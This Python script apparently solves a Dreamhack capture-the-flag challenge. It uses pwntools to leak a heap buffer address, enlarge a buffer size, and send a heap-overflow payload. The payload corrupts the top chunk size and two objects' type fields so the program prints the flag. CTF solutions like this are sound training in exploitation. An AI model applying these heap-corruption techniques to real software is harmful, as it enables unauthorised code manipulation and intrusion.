#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 18904)

    return r


def main():
    r = conn()

    # allocate buffer and apply setvbuf
    r.sendlineafter(b">> ", b"2")
    r.sendlineafter(b">> ", b"1")

    # leak buffer address
    r.sendlineafter(b">> ", b"2")
    r.recvuntil(b"your buffer: ")
    buffer = int(r.recvline()[:-1], 16)
    r.sendlineafter(b">> ", b"99999")

    # overwrite size to enable heap BOF
    r.sendlineafter(b">> ", str(0x22222).encode())
    r.sendlineafter(b"buffer: ", str(buffer).encode())
    r.sendlineafter(b"size: ", b"10000")

    # call setvbuf again to apply the new size
    r.sendlineafter(b">> ", b"2")
    r.sendlineafter(b">> ", b"1")

    payload = b"1\n" + b"Y\n"           # menu selection and canwin input for scanf
    payload += b"A" * 1020              # pad to fill buffer
    payload += b"A" * 8                 # pad prev_size field of top chunk
    payload += p64(4096)                # overwrite top chunk size
    payload += b"A" * 24                # pad to reach type field of Hatchery
    payload += b"22222\x00"             # write YELLOW_WIN string to Hatchery's type
    payload += b"A" * 58                # pad to reach type field of Bunker
    payload += p64(buffer + 1064)       # write address of YELLOW_WIN string to Bunker's type

    r.sendlineafter(b">> ", payload)
    r.recvuntil(b"Bunker is destructed...\n")
    flag = r.recvline()

    log.success(f"flag: {flag.decode()}")

if __name__ == "__main__":
    main()